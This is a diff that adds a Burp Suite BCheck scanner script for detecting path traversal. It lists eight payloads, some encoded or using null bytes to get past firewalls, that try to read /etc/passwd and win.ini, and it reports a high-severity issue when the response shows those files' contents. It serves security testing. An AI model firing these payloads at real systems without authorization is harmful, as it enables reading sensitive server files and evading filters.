@@ -1,0 +1,27 @@
+metadata:
+    language: v2-beta
+    name: "Path Traversal - Multi OS with WAF Bypass"
+    description: "Tests for path traversal with encoding, null bytes, and OS-specific bypasses"
+    author: "BCheck Arsenal"
+    tags: "path-traversal", "lfi", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "../../../../etc/passwd"
+            - "../../../../etc/passwd%00"
+            - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+            - "..%c0%af..%c0%af..%c0%afetc/passwd"
+            - "..\\..\\..\\..\\etc\\passwd"
+            - "....//....//....//....//etc/passwd"
+            - "..\\..\\..\\..\\windows\\win.ini"
+            - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+    if {check.response} matches "(root:x:|\[fonts\]|\[extensions\]|boot\.ini)" then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "Path traversal detected. Arbitrary file read from server filesystem."
+            remediation: "Use canonical path resolution. Implement directory allowlists."
+    end if
